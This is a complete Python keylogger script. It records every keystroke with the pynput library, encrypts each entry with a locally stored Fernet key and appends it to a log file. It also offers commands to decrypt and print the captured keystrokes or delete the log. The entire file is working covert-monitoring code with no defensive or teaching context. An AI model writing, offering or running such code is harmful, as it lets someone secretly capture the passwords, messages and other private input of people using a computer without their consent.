import os
import sys
from pynput import keyboard
from cryptography.fernet import Fernet

LOG_FILE = "keylog.enc"
KEY_FILE = "secret.key"

def load_or_generate_key():
    if not os.path.exists(KEY_FILE):
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as key_file:
            key_file.write(key)
    else:
        with open(KEY_FILE, "rb") as key_file:
            key = key_file.read()
    return key

key = load_or_generate_key()
cipher = Fernet(key)

def encrypt_log(data):
    encrypted_data = cipher.encrypt(data.encode())
    with open(LOG_FILE, "ab") as file:
        file.write(encrypted_data + b"\n")

def decrypt_logs():
    if not os.path.exists(LOG_FILE):
        print("No logs found.")
        return
    with open(LOG_FILE, "rb") as file:
        lines = file.readlines()
        for line in lines:
            print(cipher.decrypt(line).decode(), end="")

def clear_logs():
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
        print("Logs cleared.")
    else:
        print("No logs to clear.")

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            encrypt_log(key.char)
        else:
            encrypt_log(f" [{key}] ")
    except Exception as e:
        print(f"Error: {e}")

if len(sys.argv) > 1:
    if sys.argv[1] == "decrypt":
        decrypt_logs()
    elif sys.argv[1] == "clear":
        clear_logs()
else:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
